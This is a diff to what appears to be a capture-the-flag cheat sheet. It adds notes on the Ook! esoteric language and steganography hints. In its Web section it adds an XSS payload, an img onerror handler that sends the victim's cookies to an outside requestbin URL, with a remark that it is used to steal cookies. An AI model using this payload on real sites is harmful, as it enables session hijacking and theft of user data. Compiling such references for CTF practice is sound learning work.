@@ -46,6 +46,19 @@ Esoteric Languages
 
 ![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)
 
+* [Ook!](http://esolangs.org/wiki/ook!)
+
+	A joke language. Recognizable by `.` and `?`, and `!`.
+
+```
+Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
+Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
+Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+```
+
 
 Steganography
 ---------------------
@@ -95,6 +108,7 @@ Steganography
     When given a sequence with only A, C, G, T , there is an online mapping for these. Try this:
 
     ![img/dna_codes.png](img/dna_codes.png)
+    ![img/genome_coding.jpg](img/genome_coding.jpg)
 
 * [`snow`][snow]
 
@@ -130,6 +144,9 @@ Steganography
 sudo apt install zbar-tools
 ```
 	
+* Punctuation marks `!`, `.` and `?`
+
+	I have seen some challenges use just the end of `.` or `?` or `!` to represent the [Ook](http://esolangs.org/wiki/ook!) esoteric programming language. Don't forget that is a thing!
 
 Cryptography
 -----------------
@@ -501,6 +518,12 @@ Web
 
 ```
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+```
+
+	Typically you use this to steal cookies or other information, and you can do this with an online requestbin.
+
+```
+<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
 ```
 
 * [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)
